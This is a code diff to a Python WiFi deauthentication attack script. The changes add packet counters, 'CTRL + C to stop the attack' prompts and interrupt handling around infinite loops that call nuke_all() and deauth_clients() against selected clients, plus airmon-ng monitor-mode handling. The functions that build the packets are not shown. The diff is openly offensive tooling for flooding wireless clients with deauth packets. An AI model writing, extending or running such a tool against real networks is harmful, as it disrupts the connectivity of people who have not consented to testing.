@@ -251,6 +251,8 @@ def Select_Clients_Target():
 		print('\n[!] Incorrect input, enter the ID(s) number(s) of the client(s) !')
 		time.sleep(3)
 		Show_Avalaible_Clients()
+	except KeyboardInterrupt:
+		Menu()
 
 	Deauth_Targets()
 
@@ -264,11 +266,22 @@ def Deauth_Targets():
 	attack_length = input('\n [|] How many Deauth packets should we send ? (0 for infinite): ')
 	try:
 		if attack_length == '0':
+			sent = 0
 			if deauth_all == True:
 				while True:
+					ClearScreen()
+					print('[+] {} packets sent'.format(sent))
+					print('[|] CTRL + C to stop the attack')
+
+					sent += 1
 					nuke_all()
 			else:
 				while True:
+					ClearScreen()
+					print('[+] {} packets sent'.format(sent))
+					print('[|] CTRL + C to stop the attack')
+
+					sent += 1
 					deauth_clients()
 		else:
 
@@ -277,6 +290,7 @@ def Deauth_Targets():
 					try:
 						ClearScreen()
 						print('[+] {}/{} packets sent'.format(attack, attack_length))
+						print('[|] CTRL + C to stop the attack')
 						nuke_all()
 					except KeyboardInterrupt:
 						Menu()
@@ -285,6 +299,7 @@ def Deauth_Targets():
 					try:
 						ClearScreen()
 						print('[+] {}/{} packets sent'.format(attack, attack_length))
+						print('[|] CTRL + C to stop the attack')
 						deauth_clients()
 					except KeyboardInterrupt:
 						break
@@ -360,7 +375,7 @@ def ClearScreen():
 def exit_script():
 	global original_interface
 	global interface
-	print('\n[!] Stopping monitor mod and exiting please wait....\n')
+	print('\n\n[!] Stopping monitor mod and exiting please wait....\n')
 	subprocess.check_output(['airmon-ng', 'stop', interface])
 	time.sleep(8)
 	command_run = subprocess.call(['ip', 'link', 'set', 'dev', original_interface, 'up'])
